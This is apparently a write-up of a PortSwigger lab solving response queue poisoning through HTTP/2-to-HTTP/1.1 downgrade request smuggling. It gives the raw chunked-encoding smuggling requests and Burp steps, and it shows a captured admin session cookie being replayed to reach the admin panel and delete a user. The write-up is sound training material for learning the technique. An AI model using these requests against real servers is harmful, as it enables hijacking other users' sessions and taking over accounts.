# Response queue poisoning via H2.TE request smuggling

## Description

[This lab](https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning/lab-request-smuggling-h2-response-queue-poisoning-via-te-request-smuggling) is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests even if they have an ambiguous length.

## Reproduction and proof of concept

1. Intercept home page and send the request to Repeater. Set Repeater (top most menu) to `Allow HTTP/2 ALPN override`.
2. Expand the Inspector's Request Attributes section and change the protocol to `HTTP/2`.
3. Using Burp Repeater, try smuggling an arbitrary prefix in the body of an `HTTP/2` request using chunked encoding. 

```text
POST / HTTP/2
Host: lab-id.web-security-academy.net
Transfer-Encoding: chunked

0

SMUGGLED
```

4. Every second request sent, receives a 404 response, confirming that the back-end appends the subsequent request to the smuggled prefix.
5. Create a request, which smuggles a complete request to the back-end server. The path in both requests points to a non-existent endpoint. This means that the request will always get a `404` response. Once the response queue is poisoned, this will make it easier to recognise any other users' responses that have successfully been captured.

```text
POST /x HTTP/2
Host: lab-id.web-security-academy.net
Transfer-Encoding: chunked

0

GET /x HTTP/1.1
Host: lab-id.web-security-academy.net


```

_Note: Terminate the smuggled request properly by including the sequence `\r\n\r\n` after the Host header._

6. Send the request to poison the response queue. 
7. Wait for around 5 seconds, then send the request again to fetch an arbitrary response. Most of the time, you will receive your own 404 response. Response codes other than `404` indicate a response intended for the admin user has successfully been captured. Repeat the process until a `302` response is captured containing the admin's new post-login session cookie.

_Note: If you receive some `200` responses but can't capture a `302` response even after a lot of attempts, send 10 ordinary requests to reset the connection and try again. This whole process can take some time. It took me ten minutes._

6. Copy the stolen session cookie and use it to send a request to gain access to the `admin panel`:

```text
GET /admin HTTP/1.1
Host: 0a4900090385c6c5c058ef6800090039.web-security-academy.net
Cookie: session=hVyiIwVQdrDveY8dV6Il427xj1q8G17f
```

7. Send the request repeatedly until you receive a `200` response containing the admin panel.
8. In the response, find the URL for deleting Carlos (`/admin/delete?username=carlos`), then update the path in the request accordingly. Send the request to delete Carlos.

## Exploitability

An attacker will need to delete the user `carlos` by using response queue poisoning to break into the admin panel at `/admin`. An admin user will log in approximately every 15 seconds. The connection to the back-end is reset every 10 requests. If the connection gets into a bad state, send a few normal requests to get a fresh connection.
